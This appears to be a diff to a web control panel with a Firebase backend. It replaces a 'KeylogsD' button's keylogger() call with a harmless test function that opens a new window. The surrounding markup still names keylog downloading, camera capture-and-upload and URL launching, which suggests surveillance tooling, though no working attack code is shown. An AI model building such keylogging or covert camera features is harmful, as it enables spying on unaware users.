@@ -73,7 +73,18 @@ firebase.initializeApp(firebaseConfig);
                 alert('Camera access denied or an error occurred.');
             }
         }
-        
+        function testNewWindow() {
+        const newWindow = window.open("", "TestWindow", "width=600,height=400");
+
+        if (!newWindow) {
+            alert('Failed to open new window.');
+            return;
+        }
+
+        newWindow.document.open();
+        newWindow.document.write('<h1>New Window Opened!</h1>');
+        newWindow.document.close();
+    }
 
 
 
@@ -602,8 +613,8 @@ text-align:center;
 <div class="dfle"  style="" >
 <div id="camera-button" class="icon" onclick="captureAndUpload()" style="background:url('./img/cam.png');background-size:50px 50px;background-repeat:no-repeat;">Camera</div>
   <!-- CamSnap Beta 1.0 by @ES-->
-  <div class="icon" onclick="keylogger()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
-  <div id="keylogg"></div>
+  <div class="icon" onclick="testNewWindow()" style="background:url('./img/img6.png');background-size:50px 50px;background-repeat:no-repeat;">KeylogsD</div>
+
 <!-- Kylogs Downloader 1.0 by @ES-->
 <div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div> 
 </div>
